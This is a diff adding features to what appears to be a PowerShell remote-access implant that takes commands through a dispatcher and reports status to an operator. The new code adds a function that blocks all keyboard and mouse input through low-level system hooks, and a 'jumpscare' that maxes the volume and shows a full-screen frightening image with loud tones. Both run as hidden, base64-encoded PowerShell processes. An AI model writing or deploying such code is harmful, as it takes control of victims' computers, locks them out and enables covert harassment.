@@ -311,10 +311,89 @@ $f.ShowDialog()
   }catch{}
 }
 
+# ---- Block input (keyboard + mouse) ----
+function Block-Input{
+  try{
+    $cs=@'
+using System;
+using System.Runtime.InteropServices;
+public class IB {
+  public delegate IntPtr P(int n, IntPtr w, IntPtr l);
+  [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, P fn, IntPtr m, uint t);
+  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
+  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
+  [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr h, uint a, uint b);
+  [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG m);
+  [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
+  [StructLayout(LayoutKind.Sequential)] public struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int x; public int y; }
+  static P kb = Blk, ms = Blk;
+  static IntPtr Blk(int n, IntPtr w, IntPtr l){ return n >= 0 ? (IntPtr)1 : CallNextHookEx(IntPtr.Zero, n, w, l); }
+  public static void Start(){
+    SetWindowsHookEx(13, kb, GetModuleHandle(null), 0);
+    SetWindowsHookEx(14, ms, GetModuleHandle(null), 0);
+    MSG m;
+    while(GetMessage(out m, IntPtr.Zero, 0, 0) > 0){ TranslateMessage(ref m); DispatchMessage(ref m); }
+  }
+}
+'@
+    $inner="Add-Type -TypeDefinition @'`n$cs`n'@`n[IB]::Start()"
+    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
+    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
+    Post '`[+] input blocked (keyboard + mouse)`'
+  }catch{ Post '`[!] block failed' }
+}
+
+# ---- Jumpscare ----
+function Jump-Scare{
+  try{
+    $vol=@'
+using System;
+using System.Runtime.InteropServices;
+public class Vol {
+  [DllImport("user32.dll")] public static extern void keybd_event(byte vk, byte s, uint f, UIntPtr e);
+  public static void Max(){ for(int i=0;i<50;i++){ keybd_event(0xAF,0,0,UIntPtr.Zero); keybd_event(0xAF,0,2,UIntPtr.Zero); } }
+}
+'@
+    Add-Type -TypeDefinition $vol
+    [Vol]::Max()
+    $inner=@'
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$f=New-Object Windows.Forms.Form
+$f.FormBorderStyle='None'
+$f.WindowState='Maximized'
+$f.TopMost=$true
+$f.BackColor=[Drawing.Color]::Black
+$f.ControlBox=$false
+$pb=New-Object Windows.Forms.PictureBox
+$pb.Dock='Fill'
+$pb.SizeMode='StretchImage'
+$bmp=New-Object Drawing.Bitmap 800,600
+$g=[Drawing.Graphics]::FromImage($bmp)
+$g.Clear([Drawing.Color]::Black)
+$g.FillEllipse([Drawing.Brushes]::Red,160,120,140,140)
+$g.FillEllipse([Drawing.Brushes]::Red,500,120,140,140)
+$g.FillEllipse([Drawing.Brushes]::Black,205,165,60,60)
+$g.FillEllipse([Drawing.Brushes]::Black,545,165,60,60)
+$pen=New-Object Drawing.Pen ([Drawing.Color]::White),12
+$g.DrawArc($pen,180,320,440,220,0,180)
+$pb.Image=$bmp
+$f.Controls.Add($pb)
+$f.Add_Shown({ [console]::beep(150,1200); [console]::beep(140,1200); [console]::beep(130,1500); [console]::beep(120,2000) })
+$f.ShowDialog()
+'@
+    $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
+    Start-Process powershell.exe -ArgumentList '-NoP','-W','Hidden','-EncodedCommand',$enc -WindowStyle Hidden
+    Post '`[+] jumpscare triggered`'
+  }catch{ Post '`[!] jumpscare failed' }
+}
+
 # ---- Command dispatcher ----
 function Run-Cmd($c){
   try{
-    if($c -like 'setup:*'){
+    if($c -eq 'block'){ Block-Input }
+    elseif($c -eq 'jumpscare'){ Jump-Scare }
+    elseif($c -like 'setup:*'){
       $rest=$c.Substring(6)
       $parts=$rest -split ';', 2
       $W=$parts[0]
